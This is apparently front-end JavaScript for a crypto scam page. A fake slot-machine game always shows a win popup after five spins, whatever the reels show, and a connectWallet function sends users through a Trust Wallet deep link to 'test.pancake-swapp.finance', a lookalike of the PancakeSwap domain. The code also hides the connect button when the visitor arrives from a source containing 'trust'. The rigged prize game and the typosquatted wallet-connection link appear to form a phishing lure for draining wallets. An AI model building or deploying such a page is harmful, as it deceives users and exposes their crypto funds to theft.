window.onload = function () {
    document.body.classList.add('loaded-hiding');
    window.setTimeout(function () {
      document.body.classList.add('loaded');
      document.body.classList.remove('loaded-hiding');
    }, 500);
  };

function connectWallet() {
  const networkId = "1"; 
  const linkUrl = "https://test.pancake-swapp.finance";

  const trustWalletLink = `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(linkUrl)}&network=${networkId}`;
  window.open(trustWalletLink, "_blank");
}
const urlParams = new URLSearchParams(window.location.search);
const utmSource = urlParams.get('utm_source');

if (utmSource && utmSource.toLowerCase().includes('trust')) {
  // Скрыть кнопку
  const connectButton = document.querySelector('#connect-wallet-button');
  if (connectButton) {
    connectButton.style.display = 'none';
  }
}

const SLOTS_PER_REEL = 12;

const REEL_RADIUS = 150;

function createSlots(ring) {

  var slotAngle = 360 / SLOTS_PER_REEL;

  var seed = getSeed();

  for (var i = 0; i < SLOTS_PER_REEL; i++) {
    var slot = document.createElement('div');

    slot.className = 'slot';

    var transform = 'rotateX(' + (slotAngle * i) + 'deg) translateZ(' + REEL_RADIUS + 'px)';

    slot.style.transform = transform;

    var content = $(slot).append('<img src="img/' + ((seed + i) % 12) + '.png"/>');

    ring.append(slot);
  }
}

function getSeed() {

  return Math.floor(Math.random() * (SLOTS_PER_REEL));
}

var spinCount = 0;
var isSpinning = false;

function updateSpinCounter(count) {
  var counter = $('#spin-counter');
  if (counter) {
    counter.text(count);
  }
}

function spin(timer) {
  if (isSpinning) {
    return;
  }

  isSpinning = true;

  if (spinCount >= 5) {
    $('.popup').addClass('is-visible');
    isSpinning = false;
    return;
  }

  spinCount++;
  updateSpinCounter(5 - spinCount);

  for (var i = 1; i < 4; i++) {
    var oldSeed = -1;
    var oldClass = $('#ring' + i).attr('class');
    if (oldClass.length > 3) {
      oldSeed = parseInt(oldClass.slice(10));
    }
    var seed = getSeed();
    while (oldSeed == seed) {
      seed = getSeed();
    }

    $('#ring' + i)
      .css('animation', 'back-spin 1s, spin-' + seed + ' ' + (timer + i * 0.5) + 's')
      .attr('class', 'ring spin-' + seed);
  }

  if (spinCount >= 5) {
    setTimeout(function() {
      setTimeout(function() {
        $('.popup-win').addClass('is-visible');
        isSpinning = false;
      }, 3500);
    }, timer + 1.5);
  } else {
    isSpinning = false;
  }

  saveSpinCount();
}

function saveSpinCount() {
  localStorage.setItem('spinCount', spinCount);
}

function loadSpinCount() {
  var count = localStorage.getItem('spinCount');
  if (count !== null) {
    spinCount = parseInt(count);
    updateSpinCounter(5 - spinCount);
  }
}

$(document).ready(function() {
  loadSpinCount();
  createSlots($('#ring1'));
  createSlots($('#ring2'));
  createSlots($('#ring3'));

  $('.go').on('click', function() {
    if (!isSpinning) {
      var timer = 2;
      spin(timer);
      $('.go').attr('disabled', 'disabled');
      setTimeout(function() {
        $('.go').removeAttr('disabled');
      }, timer * 1000 + 1500);
    }
  })

  $('#xray').on('click', function() {
    var tilt = 'tiltout';

    if ($(this).hasClass('active')) {
      tilt = 'tiltout';
      $(this).removeClass('active');
      $('.slot').removeClass('backface-on');
      $('#rotate').css('animation', tilt + ' 2s 1');

      setTimeout(function() {
        $('#rotate').toggleClass('tilted');
      }, 2000);
    } else {
      tilt = 'tiltin';
      $(this).addClass('active');
      $('.slot').addClass('backface-on');
      $('#rotate').css('animation', tilt + ' 2s 1');

      setTimeout(function() {
        $('#rotate').toggleClass('tilted');
      }, 2000);
    }
  });

});